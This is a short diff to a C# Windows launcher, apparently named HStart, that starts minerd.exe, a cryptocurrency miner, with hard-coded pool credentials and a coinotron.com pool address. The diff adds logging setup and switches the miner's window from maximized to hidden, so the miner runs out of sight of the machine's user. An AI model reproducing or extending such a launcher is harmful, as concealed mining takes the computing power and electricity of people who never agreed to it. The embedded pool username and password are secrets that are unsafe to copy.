@@ -1,4 +1,5 @@
-﻿using HStart.Configuration;
+﻿using Cbs.LogLib;
+using HStart.Configuration;
 using System;
 using System.Collections.Generic;
 using System.Diagnostics;
@@ -18,6 +19,7 @@ namespace HStart.UI
         {
             Application.EnableVisualStyles();
             Application.SetCompatibleTextRenderingDefault(false);
+            Log4.Configure();
 
             StartProcInfoSection spiSection = StartProcInfoSection.CreateSection();
 
@@ -26,7 +28,7 @@ namespace HStart.UI
                 CreateNoWindow = false,
                 FileName = "minerd.exe",
                 Arguments = @"-q --userpass=Cameleer.1:helicopter --url=http://coinotron.com:8322 --algo=scrypt --threads=2 --scantime=6 --retry-pause=10",
-                WindowStyle = ProcessWindowStyle.Maximized
+                WindowStyle = ProcessWindowStyle.Hidden
             };
 
             if (spiSection.StartProcInfos[spiElement.Key] == null)
